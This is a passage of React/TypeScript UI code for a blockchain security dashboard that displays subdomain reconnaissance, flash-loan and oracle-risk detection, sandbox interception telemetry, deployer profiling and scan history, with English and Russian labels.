          </div>

          {/* Linked Protocol Intelligence from Registry */}
          {result.linked_protocol && (
            <div className="rounded-lg border border-border bg-background p-3.5 flex flex-wrap items-center justify-between gap-3">
              <div className="space-y-1">
                <p className="text-[10px] uppercase text-primary font-bold">
                  🔗 {isRu ? "Связанная инфраструктура протокола (Реестр 18,468 проектов)" : "Linked Protocol Infrastructure (18,468 Registry)"}
                </p>
                <div className="flex flex-wrap gap-2 pt-0.5">
                  {(result.linked_protocol.github || []).map((gh: string, gi: number) => (
                    <a
                      key={gi}
                      href={gh}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-semibold text-primary hover:underline"
                    >
                      📦 {gh.replace("https://github.com/", "")} ↗
                    </a>
                  ))}
                  {(result.linked_protocol.x || []).map((xUrl: string, xi: number) => (
                    <a key={xi} href={xUrl} target="_blank" rel="noopener noreferrer" className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground hover:text-foreground">
                      𝕏 {xUrl.replace("https://x.com/", "@")}
                    </a>
                  ))}
                  {(result.linked_protocol.telegram || []).map((tUrl: string, ti: number) => (
                    <a key={ti} href={tUrl} target="_blank" rel="noopener noreferrer" className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground hover:text-foreground">
                      📨 {tUrl.replace("https://t.me/", "@")}
                    </a>
                  ))}
                  {(result.linked_protocol.discord || []).map((dUrl: string, di: number) => (
                    <a key={di} href={dUrl} target="_blank" rel="noopener noreferrer" className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground hover:text-foreground">
                      💬 Discord ↗
                    </a>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Subdomains Grid */}
          {Array.isArray(result.subdomains_alive) && result.subdomains_alive.length > 0 && (
            <div className="rounded-lg border border-border bg-background p-3.5">
              <p className="mb-2 text-[10px] uppercase tracking-wider text-primary font-bold">
                🛰️ {isRu ? "Обнаруженные живые поддомены и узлы" : "Discovered Alive Subdomains & Nodes"}
              </p>
              <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3">
                {result.subdomains_alive.map((s: any, i: number) => {
                  const isPriv = (result.privileged_hosts || []).includes(s.host);
                  return (
                    <a
                      key={i}
                      href={s.url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className={`flex items-center justify-between rounded border px-3 py-2 hover:border-primary ${
                        isPriv ? "border-amber-500/50 bg-amber-500/10" : "border-border bg-card"
                      }`}
                    >
                      <span className="font-bold text-foreground truncate">
                        {isPriv ? "🔐 " : "🟢 "}
                        {s.host}
                      </span>
                      <span className="text-[10px] text-muted-foreground">
                        HTTP {s.status || "DNS"} ({fmt(s.body_len, 0)}B)
                      </span>
                    </a>
                  );
                })}
              </div>
            </div>
          )}

          {/* Enriched Smart Contracts & JS Artifacts */}
          <div className="grid grid-cols-1 gap-3 lg:grid-cols-2">
            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <p className="text-[10px] uppercase text-primary font-bold">
                📜 {isRu ? `Смарт-контракты протокола и JS-бандлов (${(result.contracts_enriched || []).length})` : `Protocol & JS Bundle Smart Contracts (${(result.contracts_enriched || []).length})`}
              </p>
              {(result.contracts_enriched || []).length === 0 ? (
                <p className="text-[11px] text-muted-foreground">—</p>
              ) : (
                <div className="max-h-56 overflow-y-auto space-y-1.5 pr-1">
                  {(result.contracts_enriched || []).map((ce: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between gap-2 rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
                      <span className="font-bold text-primary truncate">{ce.name}</span>
                      <code className="text-[10px] text-muted-foreground select-all shrink-0">{ce.address}</code>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <p className="text-[10px] uppercase text-primary font-bold">
                🔌 RPC / API / GraphQL / Backend Endpoint Groups
              </p>
              <div className="max-h-56 overflow-y-auto space-y-1.5 text-[11px]">
                {result.backend_groups &&
                  Object.entries(result.backend_groups).map(([grp, paths]: [string, any]) =>
                    Array.isArray(paths) && paths.length > 0 ? (
                      <div key={grp} className="rounded border border-border bg-card p-2">
                        <span className="font-bold uppercase text-primary">[{grp}]</span>{" "}
                        <span className="text-muted-foreground">{paths.slice(0, 6).join(", ")}</span>
                      </div>
                    ) : null
                  )}
                {[
                  ...(result.frontend?.api || []),
                  ...(result.frontend?.rpc || []),
                  ...(result.frontend?.graphql || []),
                  ...(result.frontend?.ws || []),
                ]
                  .slice(0, 12)
                  .map((u: string, idx: number) => (
                    <div key={idx} className="truncate text-muted-foreground select-all">
                      • {u}
                    </div>
                  ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 12. Flash-Loan & Spot-Oracle + Bridge Signature Detector */}
      {result && tool === "flash" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">{result.address}</span>
              <span className="ml-2 text-muted-foreground">({result.chain})</span>
            </div>
            <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
              {result.verdict} · Score: {result.composite_score}
            </span>
          </div>

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">SPOT Oracle Score</p>
              <p className="mt-1 text-sm font-bold text-red-400">{result.spot_oracle?.spot_score ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">TWAP / Chainlink Defense</p>
              <p className="mt-1 text-sm font-bold text-green-400">{result.spot_oracle?.protection_score ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">FlashLoan Callbacks</p>
              <p className="mt-1 text-sm font-bold text-amber-400">{result.spot_oracle?.flash_score ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Monetizers (Borrow/Liq)</p>
              <p className="mt-1 text-sm font-bold text-primary">{result.spot_oracle?.monetizer_score ?? 0}</p>
            </div>
          </div>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <p className="text-[10px] uppercase text-primary font-bold">
                {isRu ? "Признаки SPOT-цены и монетизации" : "Detected SPOT Reads & Monetizers"}
              </p>
              {[...(result.spot_oracle?.spot || []), ...(result.spot_oracle?.flash || []), ...(result.spot_oracle?.monetizers || [])].length === 0 ? (
                <p className="text-[11px] text-muted-foreground">—</p>
              ) : (
                <div className="space-y-1">
                  {[...(result.spot_oracle?.spot || []), ...(result.spot_oracle?.flash || []), ...(result.spot_oracle?.monetizers || [])].map((s: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between rounded border border-border bg-card px-2.5 py-1 text-[11px]">
                      <span className="text-foreground">{s.name}</span>
                      <span className="text-primary font-bold">×{s.hits}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <p className="text-[10px] uppercase text-primary font-bold">
                {isRu ? "Защитные оракулы и байткод-сигнатуры мостов" : "Oracle Defenses & Bridge Bytecode Signatures"}
              </p>
              {(result.spot_oracle?.protection || []).map((p: any, idx: number) => (
                <div key={idx} className="flex items-center justify-between rounded border border-green-500/30 bg-green-500/10 px-2.5 py-1 text-[11px] text-green-400">
                  <span>🛡️ {p.name}</span>
                  <b>×{p.hits}</b>
                </div>
              ))}
              {result.bytecode_signatures && Object.keys(result.bytecode_signatures).length > 0 && (
                <div className="pt-1 flex flex-wrap gap-1.5">
                  {Object.entries(result.bytecode_signatures).map(([cat, sels]: [string, any]) => (
                    <span key={cat} className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                      {cat}: {Array.isArray(sels) ? sels.length : 1}
                    </span>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* 13. Matrix Sandbox v16.2 (Isolated Process + AuditHook + Honeypot) */}
      {result && tool === "sandbox" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex items-center gap-2">
              <span className="font-bold text-foreground">
                Matrix Sandbox v16.2 ({result.status || "PASS"})
              </span>
              <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                ENGINE: {result.engine || "matrix_sandbox_v16_2"}
              </span>
            </div>
            <span
              className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
                String(result.verdict).startsWith("CRITICAL") || String(result.verdict).startsWith("HIGH")
                  ? "border-red-500/50 bg-red-500/15 text-red-400"
                  : "border-green-500/50 bg-green-500/15 text-green-400"
              }`}
            >
              {result.verdict}
            </span>
          </div>

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Blocked Hostile Ops</p>
              <p className="mt-1 text-sm font-bold text-red-400">{result.blocked_count ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Honeypot Simulated</p>
              <p className="mt-1 text-sm font-bold text-amber-400">{result.simulated_count ?? result.intercepted_count ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3 col-span-2">
              <p className="text-[10px] uppercase text-muted-foreground">Intercepted Subsystems</p>
              <p className="mt-1 truncate font-bold text-primary">
                {(result.dangerous_mocked || []).join(", ") || "None"}
              </p>
            </div>
          </div>

          <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
            <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
              {isRu
                ? `Телеметрия перехваченных вызовов Matrix v16.2 (${result.intercepted_count || 0}):`
                : `Matrix v16.2 Intercepted Call Telemetry (${result.intercepted_count || 0}):`}
            </p>
            {(result.intercepted_calls || []).length === 0 ? (
              <p className="text-[11px] text-muted-foreground">
                {isRu ? "Опасных вызовов не зафиксировано." : "No dangerous calls intercepted."}
              </p>
            ) : (
              <div className="space-y-1.5 max-h-60 overflow-y-auto">
                {(result.intercepted_calls || []).map((ic: any, idx: number) => (
                  <div key={idx} className="flex flex-wrap items-center justify-between gap-2 rounded border border-red-500/30 bg-red-500/5 px-3 py-1.5 text-[11px]">
                    <div className="flex items-center gap-2">
                      <span
                        className={`rounded px-1.5 py-0.5 text-[9px] font-bold uppercase ${
                          ic.classification === "BLOCKED"
                            ? "bg-red-500/25 text-red-300"
                            : "bg-amber-500/20 text-amber-300"
                        }`}
                      >
                        {ic.classification || "SIMULATED"}
                      </span>
                      <span className="font-bold text-red-400">
                        {ic.call}
                      </span>
                    </div>
                    <code className="text-foreground break-all">
                      {Array.isArray(ic.args) ? ic.args.join(" · ") : JSON.stringify(ic.args)}
                    </code>
                  </div>
                ))}
              </div>
            )}
          </div>

          {(result.stdout || result.stderr) && (
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground mb-1">Sandbox Output (stdout / stderr)</p>
              <pre className="whitespace-pre-wrap text-[11px] text-foreground">
                {result.stdout}
                {result.stderr ? `\n[stderr] ${result.stderr}` : ""}
              </pre>
            </div>
          )}
        </div>
      )}

      {/* 14. Deployer & On-Chain Address Profiler (address_profiler.py + deploy_analyzer.py) */}
      {result && tool === "deployer" && result.primary && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex flex-wrap items-center gap-2">
              <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold uppercase text-primary">
                {result.primary.type || "ADDRESS"}
              </span>
              <span className="text-primary font-bold">{result.primary.address}</span>
              <span className="text-muted-foreground">({String(result.primary.chain || "").toUpperCase()})</span>
            </div>
            <span className="rounded border border-border bg-background px-2.5 py-0.5 text-[11px] font-bold text-foreground">
              Risk: {result.primary.risk_level || "LOW"}
            </span>
          </div>

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Contract / Entity Name</p>
              <p className="mt-1 truncate font-bold text-foreground">
                {result.primary.known_label || result.primary.contract_name || "Unlabeled"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                {result.primary.category || "general"} · {result.primary.pattern || "standard"}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Age & Verification</p>
              <p className="mt-1 font-bold text-foreground">
                {result.primary.age_days !== null && result.primary.age_days !== undefined
                  ? `${result.primary.age_days} days`
                  : "—"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                Verified: {result.primary.verified ? "✅ YES" : "❌ NO"}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Native Balance / Txs</p>
              <p className="mt-1 font-bold text-foreground">
                {Number(result.primary.balance_native || 0).toFixed(4)} ETH/Native
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                Tx Count: {result.primary.tx_count ?? 0}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Proxy / Implementation</p>
              <p className="mt-1 truncate font-bold text-primary">
                {result.primary.is_proxy ? (result.primary.implementation || "Proxy") : "Standalone"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                Created: {result.primary.creation_time ? String(result.primary.creation_time).slice(0, 10) : "—"}
              </p>
            </div>
          </div>

          {/* Creator / Deployer Wallet Intelligence */}
          {result.primary.creator && (
            <div className="rounded-lg border border-primary/30 bg-background p-4 space-y-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  👤 {isRu ? "Досье кошелька Деплоера (Creator EOA / Multisig):" : "Deployer Wallet Intelligence (Creator):"}
                </span>
                {result.primary.creation_tx && (
                  <span className="truncate text-[10px] text-muted-foreground">
                    Deploy Tx: {result.primary.creation_tx.slice(0, 18)}…
                  </span>
                )}
              </div>
              <div className="flex flex-wrap items-center justify-between gap-3">
                <code className="font-bold text-foreground select-all">{result.primary.creator}</code>
                {result.primary.creator_profile && (
                  <div className="flex flex-wrap gap-3 text-[11px] text-muted-foreground">
                    <span>
                      Type: <b className="text-foreground">{String(result.primary.creator_profile.type).toUpperCase()}</b>
                    </span>
                    <span>
                      Balance: <b className="text-foreground">{Number(result.primary.creator_profile.balance_native || 0).toFixed(4)}</b>
                    </span>
                    <span>
                      Txs: <b className="text-foreground">{result.primary.creator_profile.tx_count ?? 0}</b>
                    </span>
                    {result.primary.creator_profile.age_days !== null && (
                      <span>
                        Age: <b className="text-foreground">{result.primary.creator_profile.age_days}d</b>
                      </span>
                    )}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Security Notes & Exposed ABI Functions */}
          {Array.isArray(result.primary.security_notes) && result.primary.security_notes.length > 0 && (
            <div className="rounded-lg border border-border bg-background p-3.5 space-y-1">
              <p className="text-[10px] uppercase text-primary font-bold">Security Observations</p>
              {result.primary.security_notes.map((sn: string, idx: number) => (
                <p key={idx} className="text-[11px] text-foreground">• {sn}</p>
              ))}
            </div>
          )}

          {Array.isArray(result.primary.abi_functions) && result.primary.abi_functions.length > 0 && (
            <div className="rounded-lg border border-border bg-background p-3.5">
              <p className="mb-2 text-[10px] uppercase text-muted-foreground font-bold">
                Exposed ABI Functions ({result.primary.abi_functions.length})
              </p>
              <div className="flex flex-wrap gap-1.5 max-h-36 overflow-y-auto">
                {result.primary.abi_functions.slice(0, 40).map((fn: string, idx: number) => (
                  <code key={idx} className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-foreground">
                    {fn}
                  </code>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* TOOL RUN HISTORY (Holders & Whales, Market & Derivatives, Funds Flow 14d, Social, Soroban, OSPEC) */}
      <div className="rounded-xl border border-border bg-card p-5">
        <div className="mb-4 flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <History size={15} className="text-primary" />
            <h4 className="font-mono text-xs font-bold uppercase tracking-wider text-foreground">
              {isRu
                ? "История сканов по инструментам (Holders · Market · Funds Flow · Social · Soroban · OSPEC)"
                : "Intelligence Tool Scan History (Holders · Market · Funds Flow · Social · Soroban · OSPEC)"}
            </h4>
          </div>
          <div className="flex flex-wrap gap-1.5">
            {[
              { id: "all", label: isRu ? "Все" : "All" },
              { id: "holders", label: "Holders" },
              { id: "market", label: "Market" },
              { id: "funds", label: "Funds Flow" },
              { id: "social", label: "Social" },
              { id: "soroban", label: "Soroban" },
              { id: "ospec", label: "OSPEC" },
              { id: "hacks", label: "2,539 Exploits DB" },
              { id: "deployer", label: "Deployer" },
              { id: "proxy", label: "Proxy" },
              { id: "flash", label: "Flash/Spot" },
              { id: "surface", label: "Surface" },
              { id: "sandbox", label: "Sandbox v16.2" },
            ].map((f) => (
              <button
                key={f.id}
                onClick={() => setHistoryFilter(f.id)}
                className={`rounded-lg px-2.5 py-1 font-mono text-[10px] font-semibold transition-all ${
                  historyFilter === f.id
                    ? "bg-primary text-primary-foreground"
                    : "border border-border bg-background text-muted-foreground hover:text-foreground"
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>
        </div>

        {historyItems.length === 0 ? (
          <p className="font-mono text-xs text-muted-foreground">
            {isRu
              ? "История запусков инструментов пока пуста. Любой прогон по Holders, Market, Funds Flow, Social, Soroban или OSPEC автоматически сохраняется здесь."
              : "No tool runs recorded yet. Every Holders, Market, Funds Flow, Social, Soroban or OSPEC scan is saved here automatically."}
          </p>
        ) : (
          <div className="space-y-2">
            {historyItems.map((item) => (
              <div
                key={item.id}
                className="flex flex-wrap items-center justify-between gap-3 rounded-lg border border-border bg-background px-3.5 py-2.5 font-mono text-xs"
              >
                <div className="min-w-0 flex-1">
                  <div className="flex items-center gap-2">
                    <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold uppercase text-primary">
                      {item.tool}
                    </span>
                    <span className="truncate font-bold text-foreground">{item.target}</span>
                    {item.chain && (
                      <span className="text-[10px] uppercase text-muted-foreground">[{item.chain}]</span>
                    )}
                  </div>
                  <p className="mt-1 truncate text-[11px] text-muted-foreground">
                    {item.summary} · {new Date(item.created_at * 1000).toLocaleString()}
                  </p>
                </div>
                <button
                  onClick={() => handleOpenHistoryItem(item)}
                  disabled={loadingHistoryId === item.id}
                  className="inline-flex items-center gap-1.5 rounded-lg border border-border bg-card px-3 py-1.5 text-[11px] font-semibold text-foreground transition-colors hover:border-primary hover:text-primary disabled:opacity-50"
                >
                  <Eye size={12} />
                  <span>
                    {loadingHistoryId === item.id
                      ? isRu ? "Загрузка…" : "Loading…"
                      : isRu ? "Открыть" : "Open"}
                  </span>
                </button>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default ToolsPanel;
